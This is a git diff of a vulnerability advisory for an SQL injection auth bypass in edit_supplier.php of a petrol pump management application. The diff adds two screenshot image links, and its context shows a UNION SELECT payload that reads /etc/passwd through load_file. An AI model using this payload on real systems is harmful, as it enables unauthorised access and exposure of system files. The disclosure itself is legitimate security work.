@@ -1,4 +1,4 @@
-# SOURCECODESTER / Petrol pump management software - edit_supplier.php SQL Injection Auth Bypass
+![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/b012dd34-b265-41ec-a28f-7e7f9c1aecd7)# SOURCECODESTER / Petrol pump management software - edit_supplier.php SQL Injection Auth Bypass
 
 ## **Credits**
 > Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>
@@ -29,3 +29,4 @@ id=1'+UNION+SELECT+1,load_file('/etc/passwd'),3,4,version(),6,7--+-
 ```
 
 ## Screenshot
+![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/9b8fd8bf-9f6c-4a4b-acb5-6f962ba5b6cb)
